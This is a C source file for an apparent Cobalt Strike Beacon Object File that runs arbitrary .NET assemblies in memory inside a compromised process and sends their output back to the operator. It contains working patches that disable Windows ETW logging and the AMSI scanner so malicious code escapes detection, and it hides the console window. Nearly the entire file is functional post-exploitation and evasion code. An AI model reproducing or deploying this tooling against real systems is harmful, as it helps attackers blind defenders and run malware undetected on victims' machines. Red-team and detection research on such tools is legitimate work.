#include <windows.h>
#include <io.h>
#include <stdio.h>
#include <fcntl.h>
#include <evntprov.h>

#include "beacon.h"
#include "inlineExecute-Assembly.h"

/*Make MailSlot*/
BOOL WINAPI MakeSlot(LPCSTR lpszSlotName, HANDLE* mailHandle)
{
	*mailHandle = KERNEL32$CreateMailslotA(lpszSlotName,
		0,                             //No maximum message size 
		MAILSLOT_WAIT_FOREVER,         //No time-out for operations 
		(LPSECURITY_ATTRIBUTES)NULL);  //Default security
		
	if (*mailHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	else
		return TRUE;
}

/*Read Mailslot*/
BOOL ReadSlot(char* output, HANDLE* mailHandle)
{
	DWORD cbMessage = 0;
	DWORD cMessage = 0;
	DWORD cbRead = 0;
	BOOL fResult;
	LPSTR lpszBuffer = NULL;
	size_t size = 65535;
	char* achID = (char*)intAlloc(size);
	memset(achID, 0, size);
	DWORD cAllMessages = 0;
	HANDLE hEvent;
	OVERLAPPED ov;

	hEvent = KERNEL32$CreateEventA(NULL, FALSE, FALSE, NULL);
	if (NULL == hEvent)
		return FALSE;
	ov.Offset = 0;
	ov.OffsetHigh = 0;
	ov.hEvent = hEvent;
	
	fResult = KERNEL32$GetMailslotInfo(*mailHandle, //Mailslot handle 
		(LPDWORD)NULL,               //No maximum message size 
		&cbMessage,                  //Size of next message 
		&cMessage,                   //Number of messages 
		(LPDWORD)NULL);              //No read time-out 

	if (!fResult)
	{
		return FALSE;
	}

	if (cbMessage == MAILSLOT_NO_MESSAGE)
	{
		return TRUE;
	}
	
	cAllMessages = cMessage;
	
	while (cMessage != 0)  //Get all messages
	{
		//Allocate memory for the message. 
		lpszBuffer = (LPSTR)KERNEL32$GlobalAlloc(GPTR, KERNEL32$lstrlenA((LPSTR)achID) * sizeof(CHAR) + cbMessage);
		if (NULL == lpszBuffer)
			return FALSE;
		lpszBuffer[0] = '\0';

		fResult = KERNEL32$ReadFile(*mailHandle,
			lpszBuffer,
			cbMessage,
			&cbRead,
			&ov);

		if (!fResult)
		{
			KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
			return FALSE;
		}

		//Copy mailslot output to returnData buffer
		MSVCRT$_snprintf(output + MSVCRT$strlen(output), MSVCRT$strlen(lpszBuffer) + 1, "%s", lpszBuffer);
		
		fResult = KERNEL32$GetMailslotInfo(*mailHandle,  //Mailslot handle 
			(LPDWORD)NULL,               //No maximum message size 
			&cbMessage,                  //Size of next message 
			&cMessage,                   //Number of messages 
			(LPDWORD)NULL);              //No read time-out 

		if (!fResult)
		{
			return FALSE;
		}
		
	}
	
	cbMessage = 0;
	KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
	_CloseHandle CloseHandle = (_CloseHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
	CloseHandle(hEvent);
	return TRUE;
}

/*Determine if .NET assembly is v4 or v2*/
BOOL FindVersion(void * assembly, int length) {
	char* assembly_c;
	assembly_c = (char*)assembly;
	char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
	
	for (int i = 0; i < length; i++)
	{
		for (int j = 0; j < 10; j++)
		{
			if (v4[j] != assembly_c[i + j])
			{
				break;
			}
			else
			{
				if (j == (9))
				{
					return 1;
				}
			}
		}
	}

	return 0;
}

/*Patch ETW*/
BOOL patchETW(BOOL revertETW)
{
#ifdef _M_AMD64
	unsigned char etwPatch[] = { 0 };
#elif defined(_M_IX86)
	unsigned char etwPatch[3] = { 0 };
#endif
	SIZE_T uSize = 8;
	ULONG patchSize = 0;
	
	if (revertETW != 0) {
#ifdef _M_AMD64
		//revert ETW x64
		patchSize = 1;
		MSVCRT$memcpy(etwPatch, (unsigned char[]){ 0x4c }, patchSize);
#elif defined(_M_IX86)
		//revert ETW x86
		patchSize = 3;
		MSVCRT$memcpy((char*)etwPatch, "\x8b\xff\x55", patchSize);
#endif		
	}
	else {
#ifdef _M_AMD64
		//Break ETW x64
		patchSize = 1;
		MSVCRT$memcpy(etwPatch, (unsigned char[]){ 0xc3 }, patchSize);
#elif defined(_M_IX86)
		//Break ETW x86
		patchSize = 3;
		MSVCRT$memcpy((char*)etwPatch, "\xc2\x14\x00", patchSize);
#endif			
	}
	
	//Get pointer to EtwEventWrite 
	void* pAddress = (PVOID) GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
	if(pAddress == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR , "Getting pointer to EtwEventWrite failed\n");
		return 0;
	}	
	
	void* lpBaseAddress = pAddress;
	ULONG OldProtection, NewProtection;

	//Change memory protection via NTProtectVirtualMemory
	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
	NTSTATUS status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR , "[-] NtProtectVirtualMemory failed %d\n", status);
		return 0;
	}

	//Patch ETW via NTWriteVirtualMemory
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	status = NtWriteVirtualMemory(NtCurrentProcess(), pAddress, (PVOID)etwPatch, sizeof(etwPatch)/sizeof(etwPatch[0]), NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR , "[-] NtWriteVirtualMemory failed\n");
		return 0;
	}

	//Revert back memory protection via NTProtectVirtualMemory
	status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR , "[-] NtProtectVirtualMemory2 failed\n");
		return 0;
	}

	//Successfully patched ETW
	return 1;
	
}

/*Patch AMSI*/
BOOL patchAMSI()
{
	
#ifdef _M_AMD64
    unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };//x64
#elif defined(_M_IX86)
	unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };//x86
#endif

	HINSTANCE hinst = LoadLibrary("amsi.dll");
    void* pAddress = (PVOID)GetProcAddress(hinst, "AmsiScanBuffer");
	if(pAddress == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR , "AmsiScanBuffer failed\n");
		return 0;
	}
	
	void* lpBaseAddress = pAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = sizeof(amsiPatch);
	
	//Change memory protection via NTProtectVirtualMemory
	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
	NTSTATUS status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR , "[-] NtProtectVirtualMemory failed %d\n", status);
		return 0;
	}

	//Patch AMSI via NTWriteVirtualMemory
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	status = NtWriteVirtualMemory(NtCurrentProcess(), pAddress, (PVOID)amsiPatch, sizeof(amsiPatch), NULL);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR , "[-] NtWriteVirtualMemory failed\n");
		return 0;
	}

	//Revert back memory protection via NTProtectVirtualMemory
	status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);
	if (status != STATUS_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR , "[-] NtProtectVirtualMemory2 failed\n");
		return 0;
	}
	
	//Successfully patched AMSI
	return 1;	
}

/*Start CLR*/
static BOOL StartCLR(LPCWSTR dotNetVersion, ICLRMetaHost * *ppClrMetaHost, ICLRRuntimeInfo * *ppClrRuntimeInfo, ICorRuntimeHost * *ppICorRuntimeHost) {

	//Declare variables
	HRESULT hr = NULL;

	//Get the CLRMetaHost that tells us about .NET on this machine
	hr = MSCOREE$CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost);
	
	if (hr == S_OK)
	{
		//Get the runtime information for the particular version of .NET
		hr = (*ppClrMetaHost)->lpVtbl->GetRuntime(*ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo);
		if (hr == S_OK)
		{
			/*Check if the specified runtime can be loaded into the process. This method will take into account other runtimes that may already be
			loaded into the process and set fLoadable to TRUE if this runtime can be loaded in an in-process side-by-side fashion.*/
			BOOL fLoadable;
			hr = (*ppClrRuntimeInfo)->lpVtbl->IsLoadable(*ppClrRuntimeInfo, &fLoadable);
			if ((hr == S_OK) && fLoadable)
			{
				//Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
				hr = (*ppClrRuntimeInfo)->lpVtbl->GetInterface(*ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost);
				if (hr == S_OK)
				{
					//Start it. This is okay to call even if the CLR is already running
					(*ppICorRuntimeHost)->lpVtbl->Start(*ppICorRuntimeHost);			
				}
				else
				{
				//If CLR fails to load fail gracefully
				BeaconPrintf(CALLBACK_ERROR , "[-] Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
				return 0;
				}
			}
			else
			{
				//If CLR fails to load fail gracefully
				BeaconPrintf(CALLBACK_ERROR , "[-] Process refusing to load %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
				return 0;
			}
		}
		else
		{
			//If CLR fails to load fail gracefully
			BeaconPrintf(CALLBACK_ERROR , "[-] Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
			return 0;
		}
	}
	else
	{
		//If CLR fails to load fail gracefully
		BeaconPrintf(CALLBACK_ERROR , "[-] Process refusing to create %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
		return 0;
	}

	//CLR loaded successfully
	return 1;
}

/*Check Console Exists*/
static BOOL consoleExists(void) {//https://www.devever.net/~hl/win32con
 _GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow) GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
 return !!GetConsoleWindow();
}

/*BOF Entry Point*/
void go(char* args, int length) {//Executes .NET assembly in memory

	//Declare beacon parser variables
	datap  parser;
	BeaconDataParse(&parser, args, length);
	char* appDomain = NULL;
	char* assemblyArguments = NULL;
	char* pipeName = NULL;
	char* slotName = NULL;
	BOOL amsi = 0;
	BOOL etw = 0;
	BOOL revertETW = 0;
	BOOL mailSlot = 0;
	ULONG entryPoint = 1;
	size_t assemblyByteLen = 0;
	
	//Extract data sent
	appDomain = BeaconDataExtract(&parser, NULL);
	amsi = BeaconDataInt(&parser);
	etw = BeaconDataInt(&parser);
	revertETW = BeaconDataInt(&parser);
	mailSlot = BeaconDataInt(&parser);
	entryPoint = BeaconDataInt(&parser);
	slotName = BeaconDataExtract(&parser, NULL);
	pipeName = BeaconDataExtract(&parser, NULL);
	assemblyArguments = BeaconDataExtract(&parser, NULL);
	assemblyByteLen = BeaconDataInt(&parser);
	char* assemblyBytes = BeaconDataExtract(&parser, NULL);
	
	//Create slot and pipe names	
	SIZE_T pipeNameLen = MSVCRT$strlen(pipeName);
    	char* pipePath = MSVCRT$malloc(pipeNameLen + 10);
	MSVCRT$memset(pipePath, 0, pipeNameLen + 10);
	MSVCRT$memcpy(pipePath, "\\\\.\\pipe\\", 9 );
	MSVCRT$memcpy(pipePath+9, pipeName, pipeNameLen+1 );
	
	SIZE_T slotNameLen = MSVCRT$strlen(slotName);
    	char* slotPath = MSVCRT$malloc(slotNameLen + 14);
	MSVCRT$memset(slotPath, 0, slotNameLen + 14);
	MSVCRT$memcpy(slotPath, "\\\\.\\mailslot\\", 13 );
	MSVCRT$memcpy(slotPath+13, slotName, slotNameLen+1 );
	
	//Declare other variables
	HRESULT hr = NULL;
	ICLRMetaHost* pClrMetaHost = NULL;//done
	ICLRRuntimeInfo* pClrRuntimeInfo = NULL;//done
	ICorRuntimeHost* pICorRuntimeHost = NULL;
	IUnknown* pAppDomainThunk = NULL;
	AppDomain* pAppDomain = NULL;
	Assembly* pAssembly = NULL;
	MethodInfo* pMethodInfo = NULL;
	VARIANT vtPsa = { 0 };
	SAFEARRAYBOUND rgsabound[1] = { 0 };
	wchar_t* wAssemblyArguments = NULL;
	wchar_t* wAppDomain = NULL;
	wchar_t* wNetVersion = NULL;
	LPWSTR* argumentsArray = NULL;
	int argumentCount = 0;
	HANDLE stdOutput;
	HANDLE stdError;
	HANDLE mainHandle;
	HANDLE hFile;
	size_t wideSize = 0;
	size_t wideSize2 = 0;
	BOOL success = 1;
	size_t size = 65535;
	char* returnData = (char*)intAlloc(size);
	memset(returnData, 0, size);
	
	/*Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] appdomain = %s\n", appDomain);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] amsi = %d\n", amsi);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] etw = %d\n", etw);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] revertETW = %d\n", revertETW);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] mailSlot = %d\n", mailSlot);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] entryPoint = %d\n", entryPoint);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] mailSlot name = %s\n", slotName);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Pipe name = %s\n", pipeName);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] pipePath name = %s\n", pipePath);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] mailslot Path name = %s\n", slotPath);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] assemblyArguments = %s\n", assemblyArguments);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] assemblyByteLen = %d\n", assemblyByteLen);//Debug Only
	*/
	
	//Determine .NET assemblie version
	if(FindVersion((void*)assemblyBytes, assemblyByteLen))
	{
		wNetVersion = L"v4.0.30319";
	}
	else
	{
		wNetVersion = L"v2.0.50727";
	}
	
	//Convert assemblyArguments to wide string wAssemblyArguments to pass to loaded .NET assmebly
	size_t convertedChars = 0;
	wideSize = MSVCRT$strlen(assemblyArguments) + 1;
	wAssemblyArguments = (wchar_t*)MSVCRT$malloc(wideSize * sizeof(wchar_t));
	MSVCRT$mbstowcs_s(&convertedChars, wAssemblyArguments, wideSize, assemblyArguments, _TRUNCATE);
	
	//Convert appDomain to wide string wAppDomain to pass to CreateDomain
	size_t convertedChars2 = 0;
	wideSize2 = MSVCRT$strlen(appDomain) + 1;
	wAppDomain = (wchar_t*)MSVCRT$malloc(wideSize2 * sizeof(wchar_t));
	MSVCRT$mbstowcs_s(&convertedChars2, wAppDomain, wideSize2, appDomain, _TRUNCATE);
	
	//Get an array of arguments so arugements can be passed to .NET assembly
	argumentsArray = SHELL32$CommandLineToArgvW(wAssemblyArguments, &argumentCount);

	//Create an array of strings that will be used to hold our arguments -> needed for Main(String[] args)
	vtPsa.vt = (VT_ARRAY | VT_BSTR);
	vtPsa.parray = OLEAUT32$SafeArrayCreateVector(VT_BSTR, 0, argumentCount);

	for (long i = 0; i < argumentCount; i++)
	{
		//Insert the string from argumentsArray[i] into the safearray
		OLEAUT32$SafeArrayPutElement(vtPsa.parray, &i, OLEAUT32$SysAllocString(argumentsArray[i]));
	}
		
	//Break ETW
	if (etw != 0 || revertETW != 0) {
		success = patchETW(0);	
		
		if (success != 1) {
		
			//If patching ETW fails exit gracefully
			BeaconPrintf(CALLBACK_ERROR , "Patching ETW failed.  Try running without patching ETW");
			return;
		}
	}
	
	//Start CLR
	success = StartCLR((LPCWSTR)wNetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost);
	
	//If starting CLR fails exit gracefully
	if (success != 1) {
		return;
	}
	
	if (mailSlot != 0) {
	
		//Create Mailslot
		success = MakeSlot(slotPath, &mainHandle);
		
		//Get a handle to our pipe or mailslot
		hFile = KERNEL32$CreateFileA(slotPath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
	}
	else {
		
		//Create named pipe
		_CreateNamedPipeA CreateNamedPipeA = (_CreateNamedPipeA) GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateNamedPipeA");
		mainHandle = CreateNamedPipeA(pipePath, PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 65535, 65535, 0, NULL);
		
		//Get a handle to our previously created named pipe
		hFile = KERNEL32$CreateFileA(pipePath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
    }
	
	//Attach or create console
	BOOL frConsole = 0; 
	BOOL attConsole = 0;
	attConsole = consoleExists();
	
	if (attConsole != 1)
	{
		frConsole = 1; 
		_AllocConsole AllocConsole = (_AllocConsole) GetProcAddress(GetModuleHandleA("kernel32.dll"), "AllocConsole");
		_GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow) GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
		AllocConsole();
		
		//Hide Console Window
		HINSTANCE hinst = LoadLibrary("user32.dll");
		_ShowWindow ShowWindow = (_ShowWindow)GetProcAddress(hinst, "ShowWindow");
		HWND wnd = GetConsoleWindow();
		if (wnd)
		  ShowWindow(wnd, SW_HIDE);
	}
	
	//Get current stdout handle so we can revert stdout after we finish
	_GetStdHandle GetStdHandle = (_GetStdHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetStdHandle");
	stdOutput = GetStdHandle(((DWORD)-11));
	
	//Set stdout to our newly created named pipe or mail slot
	_SetStdHandle SetStdHandle = (_SetStdHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetStdHandle");
	success = SetStdHandle(((DWORD)-11), hFile);
	
	//Create our AppDomain
	hr = pICorRuntimeHost->lpVtbl->CreateDomain(pICorRuntimeHost, (LPCWSTR)wAppDomain, NULL, &pAppDomainThunk);
	hr = pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &xIID_AppDomain, (VOID**)&pAppDomain);
	
	//Patch amsi
	if (amsi != 0) {
		success = patchAMSI();	
		
		//If patching AMSI fails exit gracefully
		if (success != 1) {
			BeaconPrintf(CALLBACK_ERROR, "Patching AMSI failed.  Try running without patching AMSI and using obfuscation");
			return;
		}
	}
		
	//Prep SafeArray 
	rgsabound[0].cElements = assemblyByteLen;
	rgsabound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = OLEAUT32$SafeArrayCreate(VT_UI1, 1, rgsabound);
	void* pvData = NULL;
	hr = OLEAUT32$SafeArrayAccessData(pSafeArray, &pvData);
	
	//Copy our assembly bytes to pvData
	MSVCRT$memcpy(pvData, assemblyBytes, assemblyByteLen);
	
	hr = OLEAUT32$SafeArrayUnaccessData(pSafeArray);

	//Prep AppDomain and EntryPoint
	hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
	if (hr != S_OK) {
		//If AppDomain fails to load fail gracefully
		BeaconPrintf(CALLBACK_ERROR , "[-] Process refusing to load AppDomain of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", wNetVersion);
		return;	
	}
	hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
	if (hr != S_OK) {
		//If EntryPoint fails to load fail gracefully
		BeaconPrintf(CALLBACK_ERROR , "[-] Process refusing to find entry point of assembly.\n");
		return;	
	}

	VARIANT retVal;
	ZeroMemory(&retVal, sizeof(VARIANT));
	VARIANT obj;
	ZeroMemory(&obj, sizeof(VARIANT));
	obj.vt = VT_NULL;

	//Change cElement to the number of Main arguments
	SAFEARRAY* psaStaticMethodArgs = OLEAUT32$SafeArrayCreateVector(VT_VARIANT, 0, (ULONG)entryPoint);//Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()

	//Insert an array of BSTR into the VT_VARIANT psaStaticMethodArgs array
	long idx[1] = { 0 };
	OLEAUT32$SafeArrayPutElement(psaStaticMethodArgs, idx, &vtPsa); 
	
	//Invoke our .NET Method
	hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo, obj, psaStaticMethodArgs, &retVal);
	
	if (mailSlot != 0) {
		//Read from our mailslot
		success = ReadSlot(returnData, &mainHandle);
	}
	else {
		//Read from named pipe
		DWORD bytesToRead = 65535;
		DWORD bytesRead = 0;
		success = KERNEL32$ReadFile(mainHandle, (LPVOID)returnData, bytesToRead, &bytesRead, NULL);
    }
	
	//Send .NET assembly output back to CS
	BeaconPrintf(CALLBACK_OUTPUT, "\n\n%s\n", returnData);

	//Close handles
	_CloseHandle CloseHandle = (_CloseHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
	CloseHandle(mainHandle);
	CloseHandle(hFile);
	
	//Revert stdout back to original handles
	success = SetStdHandle(((DWORD)-11), stdOutput);
	
	//Clean up
	OLEAUT32$SafeArrayDestroy(pSafeArray);
	OLEAUT32$VariantClear(&retVal);
	OLEAUT32$VariantClear(&obj);
	OLEAUT32$VariantClear(&vtPsa);
	
	if (NULL != psaStaticMethodArgs) {
		OLEAUT32$SafeArrayDestroy(psaStaticMethodArgs);

		psaStaticMethodArgs = NULL;
	}
	if (pMethodInfo != NULL) {

		pMethodInfo->lpVtbl->Release(pMethodInfo);
		pMethodInfo = NULL;
	}
	if (pAssembly != NULL) {

		pAssembly->lpVtbl->Release(pAssembly);
		pAssembly = NULL;
	}
	if (pAppDomain != NULL) {

		pAppDomain->lpVtbl->Release(pAppDomain);
		pAppDomain = NULL;
	}
	if (pAppDomainThunk != NULL) {

		pAppDomainThunk->lpVtbl->Release(pAppDomainThunk);
	}
	if (pICorRuntimeHost != NULL)
	{
		(pICorRuntimeHost)->lpVtbl->UnloadDomain(pICorRuntimeHost, pAppDomainThunk);
		(pICorRuntimeHost) = NULL;
	}
	if (pClrRuntimeInfo != NULL)
	{
		(pClrRuntimeInfo)->lpVtbl->Release(pClrRuntimeInfo);
		(pClrRuntimeInfo) = NULL;
	}
	if (pClrMetaHost != NULL)
	{
		(pClrMetaHost)->lpVtbl->Release(pClrMetaHost);
		(pClrMetaHost) = NULL;
	}

	//Free console only if we attached one
	if (frConsole != 0) {
	_FreeConsole FreeConsole = (_FreeConsole) GetProcAddress(GetModuleHandleA("kernel32.dll"), "FreeConsole");
	success = FreeConsole();
	}
	
	//Revert ETW if chosen
	if (revertETW != 0) {
		success = patchETW(revertETW);

		if (success != 1) {
		
			BeaconPrintf(CALLBACK_ERROR , "Reverting ETW back failed");		
		}		
	}
	
	BeaconPrintf(CALLBACK_OUTPUT, "[+] inlineExecute-Assembly Finished\n");	
}
